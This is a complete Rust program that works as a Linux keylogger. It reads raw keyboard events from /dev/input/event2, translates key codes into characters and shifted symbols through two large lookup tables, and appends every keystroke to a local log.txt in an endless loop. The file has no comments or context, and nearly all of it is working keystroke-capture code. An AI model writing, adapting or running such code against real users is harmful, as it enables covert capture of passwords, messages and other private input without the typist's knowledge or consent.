use std::{
    fs::{File, OpenOptions},
    io::{Read, Write},
    mem::{size_of, transmute},
};

#[derive(Debug)]
#[repr(C)]
struct InputEvent {
    tv_sec: isize,
    tv_usec: isize,
    pub type_: u16,
    code: u16,
    value: i32,
}

const KEY_MAX: u32 = 122;

const EV_KEY: u16 = 1;
const KEY_RELEASE: i32 = 0;
const KEY_PRESS: i32 = 1;

const KEY_LEFTSHIFT: u16 = 42;
const KEY_RIGHTSHIFT: u16 = 54;

const UNKNOWN: &str = "<KR>";

const KEYS: [&str; 127] = [
    UNKNOWN,
    "<ESC>",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    "<backspace>",
    "<TAB>",
    "q",
    "w",
    "e",
    "r",
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "[",
    "]",
    "<Enter>",
    "<LCTRL>",
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    ";",
    "'",
    "`",
    "<LSHIFT>",
    "\\",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n",
    "m",
    ",",
    ".",
    "/",
    "<RSHIFT>",
    "<KP*>",
    "<LALT>",
    " ",
    "<CapsLock>",
    "<F1>",
    "<F2>",
    "<F3>",
    "<F4>",
    "<F5>",
    "<F6>",
    "<F7>",
    "<F8>",
    "<F9>",
    "<F10>",
    "<NumLock>",
    "<ScrollLock>",
    "<KP7>",
    "<KP8>",
    "<KP9>",
    "<KPMINUS>",
    "<KP4>",
    "<KP5>",
    "<KP6>",
    "<KPPLUS>",
    "<KP1>",
    "<KP2>",
    "<KP3>",
    "<KP0>",
    "<KPDOT>",
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    "<F11>",
    "<F12>",
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    "<KPEnter>",
    "<RCTRL>",
    "<KP/>",
    "<SysRQ>",
    "<RALT>",
    UNKNOWN,
    "<Home>",
    "<UP>",
    "<PAGE_UP>",
    "<LEFT>",
    "<RIGHT>",
    "<END>",
    "<DOWN>",
    "<PAGEDOWN>",
    "<INSERT>",
    "<DELETE>",
    "<DELETE>",
    "<MACRO>",
    "<MUTE>",
    "<VOLUME_DOWN>",
    "<VOLUME_UP>",
    "<POWER>",
    "<KPEqual>",
    "<KPPlusMinus>",
    "<KPPause>",
    "<KPScale>",
    "<KPComma>",
    UNKNOWN,
    UNKNOWN,
    "<LEFT_META>",
    "<RIGHT_META>",
];

const KEYS_SHIFT: [&str; 127] = [
    UNKNOWN,
    "<ESC>",
    "!",
    "@",
    "#",
    "$",
    "%",
    "^",
    "&",
    "*",
    "(",
    ")",
    "_",
    "+",
    "<Backspace>",
    "<Tab>",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "{",
    "}",
    "<Enter>",
    "<LCTRL>",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    ":",
    "\"",
    "~",
    "<LSHIFT>",
    "|",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "<",
    ">",
    "?",
    "<RSHIFT>",
    "<KP*>",
    "<LALT>",
    " ",
    "<CapsLock>",
    "<F1>",
    "<F2>",
    "<F3>",
    "<F4>",
    "<F5>",
    "<F6>",
    "<F7>",
    "<F8>",
    "<F9>",
    "<F10>",
    "<NumLock>",
    "<ScrollLock>",
    "<KP7>",
    "<KP8>",
    "<KP9>",
    "<KPMINUS>",
    "<KP4>",
    "<KP5>",
    "<KP6>",
    "<KPPLUS>",
    "<KP1>",
    "<KP2>",
    "<KP3>",
    "<KP0>",
    "<KPDOT>",
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    "<F11>",
    "<F12>",
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    UNKNOWN,
    "<KPEnter>",
    "<RCTRL>",
    "<KP/>",
    "<SysRQ>",
    "<RALT>",
    UNKNOWN,
    "<Home>",
    "<UP>",
    "<PAGE_UP>",
    "<LEFT>",
    "<RIGHT>",
    "<END>",
    "<DOWN>",
    "<PAGEDOWN>",
    "<INSERT>",
    "<DELETE>",
    "<DELETE>",
    "<MACRO>",
    "<MUTE>",
    "<VOLUME_DOWN>",
    "<VOLUME_UP>",
    "<POWER>",
    "<KPEqual>",
    "<KPPlusMinus>",
    "<KPPause>",
    "<KPScale>",
    "<KPComma>",
    UNKNOWN,
    UNKNOWN,
    "<LEFT_META>",
    "<RIGHT_META>",
];

fn main() {
    let mut log_file = OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open("log.txt")
        .unwrap_or_else(|e| panic!("{}", e));

    let mut event_file = File::open("/dev/input/event2").unwrap_or_else(|e| panic!("{}", e));
    let mut buf: [u8; 24] = [0; 24];

    let mut shift_pressed = 0;
    loop {
        let read_bytes = event_file.read(&mut buf[..]).unwrap();
        let event_size: usize = size_of::<InputEvent>();

        if read_bytes != event_size {
            panic!("Error did not read enough bytes from event stream");
        }

        let event: InputEvent = unsafe { transmute(buf) };

        if event.type_ == EV_KEY {
            if event.value == KEY_PRESS {
                if is_shift(event.code) {
                    shift_pressed += 1;
                }

                match get_key(event.code, shift_pressed) {
                    Ok(key) => {
                        write_to_file(key, &mut log_file);
                    }
                    Err(key_error) => match key_error {
                        KeyError::OutOfBounds(code) => println!("Key {}, is out of bounds", code),
                    },
                }
            } else if event.value == KEY_RELEASE && is_shift(event.code) {
                shift_pressed -= 1;
            }
        }
    }
}

fn write_to_file(key: &str, log_file: &mut File) {
    let text = key.as_bytes();
    let result = log_file.write(key.as_bytes());
    if let Ok(written_bytes) = result {
        if written_bytes != text.len() {
            println!(
                "Written bytes where {}, but text was {}",
                written_bytes,
                text.len(),
            )
        }
    } else {
        println!("There was an error while writing to the file");
    }
}

fn is_shift(key: u16) -> bool {
    KEY_RIGHTSHIFT == key || KEY_LEFTSHIFT == key
}

enum KeyError {
    OutOfBounds(u16),
}

fn get_key(code: u16, is_shift: u16) -> Result<&'static str, KeyError> {
    if code as u32 > KEY_MAX {
        return Err(KeyError::OutOfBounds(code));
    }
    let keys = if is_shift != 0 { KEYS_SHIFT } else { KEYS };
    Ok(keys[code as usize])
}
